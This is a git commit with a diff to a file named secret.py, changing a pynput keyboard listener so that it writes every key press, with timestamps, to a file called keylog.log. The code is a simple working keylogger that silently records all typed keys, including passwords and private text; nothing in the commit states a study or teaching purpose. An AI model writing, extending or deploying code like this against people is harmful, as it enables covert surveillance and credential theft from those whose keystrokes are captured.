c7b2a4b765b6e23382d830fbaa331e488e226a53
Stephen <ssjohnson1990@gmail.com>
2018-10-15 16:21:46 -0400

    logging

--- secret.py
+++ secret.py
@@ -1,15 +1,20 @@
 from pynput import keyboard
+import logging
+
+log_file = "keylog.log"
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s : %(message)s')
 
 def on_press(key):
     try: 
-        print('Key {0} pressed'.format(key.char))
+        logging.info('Key {0} pressed'.format(key.char))
     except:
-        print('special key {0} pressed'.format(key))
-
+        logging.info('special key {0} pressed'.format(key))
+        
 def on_release(key):
     print('{0} released'.format(key))
     if key == keyboard.Key.esc:
         return False
+
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
